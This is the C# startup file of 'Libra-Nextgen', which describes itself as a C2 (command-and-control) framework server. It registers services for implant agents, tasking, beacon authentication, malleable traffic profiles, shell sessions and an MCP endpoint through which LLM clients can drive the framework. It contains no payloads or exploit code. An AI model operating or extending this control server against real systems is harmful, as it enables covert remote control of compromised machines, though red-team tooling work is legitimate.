using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.RateLimiting;
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Hosting.Server;
using Microsoft.AspNetCore.Hosting.Server.Features;
using Microsoft.IdentityModel.Tokens;
using Scalar.AspNetCore;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Configuration;
using LibraNextgen.Service.Data;
using LibraNextgen.Service.Profiles;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Hubs;
using LibraNextgen.Service.Middleware;
using LibraNextgen.Service.Models;
using LibraNextgen.Service.Services;
using LibraNextgen.Service.Controllers;

var builder = WebApplication.CreateBuilder(args);

// MongoDB
builder.Services.Configure<MongoSettings>(builder.Configuration.GetSection(MongoSettings.SectionName));
builder.Services.AddSingleton<MongoDbContext>();
builder.Services.AddSingleton<ServerKeyService>();
builder.Services.AddSingleton<MongoIndexBuilder>();

// Beacon authentication (shared secret injected at build time)
builder.Services.Configure<BeaconSettings>(builder.Configuration.GetSection(BeaconSettings.SectionName));

// 监听端口设置（%APPDATA%\Libra-Nextgen\settings.json，可运行时修改）
var listenerSettings = ListenerSettingsLoader.Load();
builder.WebHost.ConfigureKestrel(options =>
{
    if (listenerSettings.BindLoopbackOnly)
        options.ListenLocalhost(listenerSettings.Port);
    else
        options.ListenAnyIP(listenerSettings.Port);
});

builder.Services.AddHttpClient();

// Typed repositories per collection
builder.Services.AddScoped<Repository<Agent>>(sp =>
    new Repository<Agent>(sp.GetRequiredService<MongoDbContext>(), "agents"));
builder.Services.AddScoped<Repository<AgentTask>>(sp =>
    new Repository<AgentTask>(sp.GetRequiredService<MongoDbContext>(), "tasks"));
builder.Services.AddScoped<Repository<User>>(sp =>
    new Repository<User>(sp.GetRequiredService<MongoDbContext>(), "users"));
builder.Services.AddScoped<Repository<AuditLog>>(sp =>
    new Repository<AuditLog>(sp.GetRequiredService<MongoDbContext>(), "audit_logs"));
builder.Services.AddScoped<Repository<MalleableProfileConfig>>(sp =>
    new Repository<MalleableProfileConfig>(sp.GetRequiredService<MongoDbContext>(), "profiles"));
builder.Services.AddScoped<Repository<TrafficRecord>>(sp =>
    new Repository<TrafficRecord>(sp.GetRequiredService<MongoDbContext>(), "traffic"));
builder.Services.AddScoped<Repository<AccessKey>>(sp =>
    new Repository<AccessKey>(sp.GetRequiredService<MongoDbContext>(), "access_keys"));
builder.Services.AddScoped<Repository<PluginRecord>>(sp =>
    new Repository<PluginRecord>(sp.GetRequiredService<MongoDbContext>(), "plugins"));
builder.Services.AddScoped<Repository<BuildTrafficLists>>(sp =>
    new Repository<BuildTrafficLists>(sp.GetRequiredService<MongoDbContext>(), "build_lists"));
builder.Services.AddScoped<BuildListService>();
builder.Services.AddScoped<AiService>();

// JWT Settings (singleton, holds RSA key pair)
var jwtSettings = new JwtSettings();
builder.Services.AddSingleton(jwtSettings);
builder.Services.AddScoped<AuthService>();
builder.Services.AddScoped<AccountService>();
builder.Services.AddScoped<ProfileService>();
builder.Services.AddScoped<AgentService>();
builder.Services.AddScoped<TaskService>();
builder.Services.AddScoped<AgentCommsService>();
builder.Services.AddScoped<RelayService>();
builder.Services.AddSingleton<ServerScriptService>();

// WebSocket
builder.Services.AddSingleton<ISessionLock, ShellSessionLock>();
builder.Services.AddSingleton<AgentTrafficService>();
builder.Services.AddSingleton<ConnectionManager>();
builder.Services.AddSingleton<SessionKeyStore>();
builder.Services.AddSingleton<AgentEventHub>();
builder.Services.AddSingleton<DownloadTicketStore>();
builder.Services.AddSingleton<RiskPolicyService>();
builder.Services.AddSingleton<PermissionService>();
builder.Services.AddSingleton<McpService>();
builder.Services.AddScoped<AuditService>();
builder.Services.AddScoped<AccessKeyService>();
builder.Services.AddSingleton<BuilderBuildService>();
builder.Services.AddScoped<PluginService>();
builder.Services.AddHostedService<HeartbeatMonitor>();

// MCP Server — stateless: 每次请求独立鉴权（AccessKey），无需服务端会话状态；
// 避免客户端必须先用 initialize 建会话才能调用工具。
builder.Services.AddHttpContextAccessor();
builder.Services.AddMcpServer()
    .WithHttpTransport(options => options.Stateless = true)
    .WithToolsFromAssembly();

// Auth
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = jwtSettings.Issuer,
            ValidAudience = jwtSettings.Audience,
            IssuerSigningKey = new RsaSecurityKey(jwtSettings.Rsa),
            ClockSkew = TimeSpan.Zero
        };
        options.Events = new JwtBearerEvents
        {
            OnMessageReceived = context =>
            {
                var token = context.Request.Query["token"].FirstOrDefault();
                if (string.IsNullOrEmpty(token) &&
                    context.HttpContext.Request.RouteValues.TryGetValue("token", out var routeToken))
                {
                    token = routeToken?.ToString();
                }
                if (!string.IsNullOrEmpty(token))
                {
                    context.Token = token;
                }
                return Task.CompletedTask;
            }
        };
    });
builder.Services.AddAuthentication()
    .AddScheme<AuthenticationSchemeOptions, AccessKeyAuthHandler>("AccessKey", null);
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("McpPolicy", policy =>
        policy.AddAuthenticationSchemes("AccessKey").RequireAuthenticatedUser());
});

// Controllers + OpenAPI with Scalar UI
builder.Services.AddControllers().AddJsonOptions(options =>
{
    options.JsonSerializerOptions.Converters.Add(new JsonStringEnumConverter());
    // Match camelCase JSON (e.g. plugin meta.json "argsSchema") against
    // PascalCase C# models, case-insensitively. The plugin meta uses
    // camelCase keys; without this the nested classes deserialize empty.
    options.JsonSerializerOptions.PropertyNamingPolicy = JsonNamingPolicy.CamelCase;
    options.JsonSerializerOptions.PropertyNameCaseInsensitive = true;
});
builder.Services.AddOpenApi("v1", options =>
{
    options.AddDocumentTransformer((document, _, _) =>
    {
        document.Info.Title = "Libra-Nextgen API";
        document.Info.Version = "v1";
        document.Info.Description = "Libra-Nextgen C2 Framework REST API";
        return Task.CompletedTask;
    });
});

// WebSocket middleware is enabled via app.UseWebSockets()

// CORS — 内网/局域网/本机全域开放；仅本机回环监听时收窄到配置来源。
var listenerSettings2 = ListenerSettingsLoader.Load();
var securitySettings = SecuritySettingsLoader.Load();
var allowedOrigins = builder.Configuration.GetSection("Cors:AllowedOrigins").Get<string[]>() ?? [];
builder.Services.AddCors(options =>
{
    options.AddPolicy("CorsSignalR", policy =>
    {
        if (listenerSettings2.BindLoopbackOnly)
        {
            // 仅本机回环：只有配置的来源（开发机）允许跨域；未配置则默认全放。
            if (allowedOrigins.Length > 0)
                policy.WithOrigins(allowedOrigins).AllowAnyHeader().AllowAnyMethod();
            else
                policy.AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod();
        }
        else if (securitySettings.OpenLan)
        {
            // 局域网/内网开放：任意来源可访问（内网对抗控制台）。
            policy.AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod();
        }
        else
        {
            // 关闭局域网开放：仅配置的来源（开发机）允许跨域。
            if (allowedOrigins.Length > 0)
                policy.WithOrigins(allowedOrigins).AllowAnyHeader().AllowAnyMethod();
            else
                policy.AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod();
        }
    });
});

// Rate Limiting
builder.Services.AddRateLimiter(options =>
{
    options.AddPolicy("auth", context =>
    {
        var ip = context.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        return RateLimitPartition.GetFixedWindowLimiter(ip, _ => new FixedWindowRateLimiterOptions
        {
            PermitLimit = 5,
            Window = TimeSpan.FromMinutes(1),
            QueueProcessingOrder = QueueProcessingOrder.OldestFirst,
            QueueLimit = 0,
        });
    });
    // MCP 按访问 key 身份限流（未认证请求退回按 IP）：防失控 LLM 循环/泄露 key 刷任务。
    options.AddPolicy("mcp", context =>
    {
        var key = context.User.FindFirst(System.Security.Claims.ClaimTypes.NameIdentifier)?.Value
                  ?? context.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        return RateLimitPartition.GetFixedWindowLimiter(key, _ => new FixedWindowRateLimiterOptions
        {
            PermitLimit = 120,
            Window = TimeSpan.FromMinutes(1),
            QueueProcessingOrder = QueueProcessingOrder.OldestFirst,
            QueueLimit = 0,
        });
    });
    options.RejectionStatusCode = 429;
});

var app = builder.Build();

// 端口修改后的重绑委托（由 SettingsController 触发）。
// Kestrel 启动后 IServerAddressesFeature.Addresses 不可再改（会抛
// "cannot be modified after the server has started"），因此改为自重启：
// 后台任务先触发进程退出，再由外部守护（systemd 服务 / scripts 里的
// start 脚本）重启加载新端口。设置已先持久化到 settings.json，重启后生效。
SettingsController.RebindListeners = (listenUrl, ct) =>
{
    _ = Task.Run(async () =>
    {
        await Task.Delay(1500, ct);
        var logger = app.Services.GetRequiredService<ILoggerFactory>()
            .CreateLogger("ListenerRebind");
        logger.LogInformation("Listener changed to {Url} — restarting service", listenUrl);
        try
        {
            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            logger.LogError(ex, "Failed to trigger graceful shutdown");
        }
    }, ct);
    return Task.CompletedTask;
};

// 全局异常处理：生产环境统一 JSON 响应（不泄露堆栈/内部细节），dev 保留
// DeveloperExceptionPage 便于排查。异常必须记录到日志（结构化，含 traceId）。
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}
app.UseExceptionHandler(errorApp =>
{
    errorApp.Run(async context =>
    {
        var exception = context.Features.Get<Microsoft.AspNetCore.Diagnostics.IExceptionHandlerFeature>()?.Error;
        var logger = context.RequestServices.GetRequiredService<ILoggerFactory>()
            .CreateLogger("GlobalExceptionHandler");
        if (exception != null)
            logger.LogError(exception, "Unhandled exception: {Path} {Method}",
                context.Request.Path, context.Request.Method);

        context.Response.StatusCode = StatusCodes.Status500InternalServerError;
        context.Response.ContentType = "application/json; charset=utf-8";
        await context.Response.WriteAsJsonAsync(new { error = "Internal server error" });
    });
});

app.MapOpenApi();
if (app.Environment.IsDevelopment())
{
    app.MapScalarApiReference(options =>
    {
        options.Title = "Libra-Nextgen API";
        options.Theme = Scalar.AspNetCore.ScalarTheme.DeepSpace;
    });
}

// WebSocket：服务端每 30s 主动发一次 Ping 保活（默认 2min 太长，公网
// nginx 等中间设备的空闲超时（proxy_read_timeout 通常 60s）会先掐断）。
// agent 侧另有 15s 客户端 Ping 保活，双保险。
app.UseWebSockets(new WebSocketOptions { KeepAliveInterval = TimeSpan.FromSeconds(30) });
// 显式路由点：路径改写中间件必须在 UseRouting 之前执行，
// 否则 EndpointRouting 已按原路径匹配，改写不会生效。
app.UseMiddleware<BeaconEntryMiddleware>();
app.UseMiddleware<ProfileFingerprintMiddleware>();
app.UseRouting();
app.UseCors("CorsSignalR");
app.UseAuthentication();
app.UseAuthorization();
// 限流必须在认证之后：MCP 的 "mcp" 策略按 access-key 身份分区，
// auth 策略按 IP 分区（不受顺序影响）。
app.UseRateLimiter();
app.UseMiddleware<PermissionMiddleware>();
app.UseMiddleware<AuditMiddleware>();
app.MapControllers();
app.UseMiddleware<McpToggleMiddleware>();
app.MapMcp("/mcp").RequireAuthorization("McpPolicy").RequireRateLimiting("mcp");
WebSocketHandler.Map(app);

// Ensure MongoDB indexes exist before serving traffic (best-effort).
try
{
    using (var scope = app.Services.CreateScope())
    {
        var indexBuilder = scope.ServiceProvider.GetRequiredService<MongoIndexBuilder>();
        indexBuilder.EnsureIndexesAsync().GetAwaiter().GetResult();
        var riskPolicy = scope.ServiceProvider.GetRequiredService<RiskPolicyService>();
        riskPolicy.LoadAsync().GetAwaiter().GetResult();
        var mcp = scope.ServiceProvider.GetRequiredService<McpService>();
        mcp.LoadAsync().GetAwaiter().GetResult();
        var plugins = scope.ServiceProvider.GetRequiredService<PluginService>();
        plugins.PreloadScriptsAsync().GetAwaiter().GetResult();
        var sessionKeys = scope.ServiceProvider.GetRequiredService<SessionKeyStore>();
        sessionKeys.LoadAsync().GetAwaiter().GetResult();
    }
}
catch (Exception ex)
{
    var logger = app.Services.GetRequiredService<ILoggerFactory>().CreateLogger("Startup");
    logger.LogWarning(ex, "MongoDB index initialization failed — continuing without indexes.");
}

app.Run();

/// <summary>Exposed for WebApplicationFactory-based integration tests.</summary>
public partial class Program { }
